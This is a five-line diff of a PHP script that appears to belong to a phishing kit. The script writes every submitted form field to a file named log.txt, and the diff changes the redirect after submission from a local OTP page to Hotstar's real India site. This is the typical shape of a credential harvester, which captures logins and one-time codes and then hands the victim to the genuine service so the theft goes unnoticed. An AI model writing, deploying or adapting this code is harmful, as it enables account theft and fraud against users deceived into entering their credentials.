@@ -1,5 +1,5 @@
 <?php
-header ('Location: otp.html');
+header ('Location: https://www.hotstar.com/in');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
